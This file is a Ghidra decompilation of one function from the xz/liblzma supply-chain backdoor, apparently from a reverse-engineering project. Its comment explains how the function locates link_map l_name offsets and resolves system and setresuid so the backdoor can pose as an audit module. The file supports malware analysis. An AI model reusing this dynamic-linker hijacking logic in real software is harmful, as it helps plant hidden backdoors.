// /home/kali/xzre-ghidra/xzregh/104080_find_link_map_l_name.c
// Function: find_link_map_l_name @ 0x104080
// Calling convention: unknown
// Prototype: undefined find_link_map_l_name(void)


/*
 * AutoDoc: Walks the liblzma link_map table (pulled from the `.data` copy baked into the object) to find
 * the entry whose RELRO tuple matches the live liblzma image, then computes the displacement of
 * each `link_map::l_name` pointer relative to that snapshot. Along the way it resolves the
 * `_dl_audit_symbind_alt` template, several libc helpers (exit, setresuid/gid, system, shutdown),
 * and caches the displacement so later code can rewrite libcrypto's `l_name` field when posing
 * as an audit module.
 */
#include "xzre_types.h"


undefined8 find_link_map_l_name(long *param_1,long *param_2,long param_3,long param_4)

{
  int *piVar1;
  undefined8 uVar2;
  long *plVar3;
  int iVar4;
  uint uVar5;
  long lVar6;
  long lVar7;
  long lVar8;
  long lVar9;
  long lVar10;
  long *plVar11;
  long *plVar12;
  long *plVar13;
  long *plVar14;
  long *plVar15;
  
  iVar4 = secret_data_append_from_address(0,0x6c,0x10,5);
  if (iVar4 != 0) {
    piVar1 = *(int **)(param_4 + 0x118);
    plVar15 = *(long **)(*param_1 + 0x10);
    lVar6 = get_lzma_allocator(1);
    *(undefined8 *)(lVar6 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
    lVar7 = lzma_alloc(0x8a8,lVar6);
    *(long *)(piVar1 + 6) = lVar7;
    if (lVar7 != 0) {
      *piVar1 = *piVar1 + 1;
    }
    lVar7 = lzma_alloc(0x428,lVar6);
    *(long *)(piVar1 + 0x16) = lVar7;
    if (lVar7 != 0) {
      *piVar1 = *piVar1 + 1;
    }
    lVar7 = lzma_alloc(0x5f0,lVar6);
    *(long *)(piVar1 + 8) = lVar7;
    if (lVar7 != 0) {
      *piVar1 = *piVar1 + 1;
    }
    lVar7 = get_lzma_allocator(1);
    uVar2 = *(undefined8 *)(param_1[1] + 8);
    *(undefined8 *)(lVar7 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
    lVar8 = elf_symbol_get(uVar2,0xa60,0);
    if (lVar8 != 0) {
      lVar9 = lzma_alloc(0x4e0,lVar7);
      *(long *)(param_4 + 0x68) = lVar9;
      if (lVar9 != 0) {
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
      }
      lVar9 = *(long *)(lVar8 + 8) + **(long **)(param_1[1] + 8);
      iVar4 = elf_contains_vaddr(*(long **)(param_1[1] + 8),lVar9,*(undefined8 *)(lVar8 + 0x10),4);
      plVar13 = plVar15 + 300;
      if (iVar4 != 0) {
LAB_001041f0:
        if (plVar15 != plVar13) {
          lVar10 = *(long *)(param_1[1] + 0x18);
          if ((*plVar15 != *(long *)(lVar10 + 0x50)) || (plVar15[1] != *(long *)(lVar10 + 0x58)))
          goto LAB_001041ec;
          plVar11 = (long *)0x0;
          plVar12 = (long *)0xffffffffffffffff;
          for (plVar13 = *(long **)(*param_1 + 0x10); plVar13 < plVar15 + 3; plVar13 = plVar13 + 1)
          {
            plVar3 = (long *)*plVar13;
            if (plVar15 + 3 <= plVar3) {
              plVar14 = plVar12;
              if (plVar15 + 0xd <= plVar12) {
                plVar14 = plVar15 + 0xd;
              }
              if (plVar3 < plVar14) {
                plVar11 = plVar13;
                plVar12 = plVar3;
              }
            }
          }
          if (plVar12 != (long *)0xffffffffffffffff) {
            *(undefined8 *)(lVar6 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
            lVar10 = lzma_alloc(0xab8,lVar6);
            *(long *)(piVar1 + 10) = lVar10;
            if (lVar10 != 0) {
              *piVar1 = *piVar1 + 1;
            }
            plVar15 = *(long **)(*param_1 + 0x10);
            lVar10 = (long)plVar12 - (long)plVar15;
            uVar5 = (int)plVar15 - (int)plVar11;
            if (plVar15 <= plVar11) {
              uVar5 = (int)plVar11 - (int)plVar15;
            }
            *(ulong *)(param_3 + 0xf8) = (ulong)uVar5 + *(long *)(*param_1 + 0x18);
            iVar4 = find_lea_instruction(lVar9,lVar9 + *(long *)(lVar8 + 0x10),lVar10);
            if (iVar4 == 0) {
              return 0;
            }
            iVar4 = find_lea_instruction
                              (*(long *)(param_3 + 0x100),
                               *(long *)(param_3 + 0x108) + *(long *)(param_3 + 0x100),lVar10);
            if (iVar4 == 0) {
              return 0;
            }
            *(undefined8 *)(lVar6 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
            lVar8 = lzma_alloc(0x9f8,lVar6);
            *(long *)(piVar1 + 0xc) = lVar8;
            if (lVar8 != 0) {
              *piVar1 = *piVar1 + 1;
            }
            lVar6 = lzma_alloc(0x760,lVar6);
            *(long *)(piVar1 + 0x18) = lVar6;
            if (lVar6 != 0) {
              *piVar1 = *piVar1 + 1;
            }
            *(undefined8 *)(lVar7 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
            *param_2 = lVar10;
            return 1;
          }
        }
      }
      lzma_free(*(undefined8 *)(param_4 + 0x68),lVar7);
    }
  }
  return 0;
LAB_001041ec:
  plVar15 = plVar15 + 1;
  goto LAB_001041f0;
}

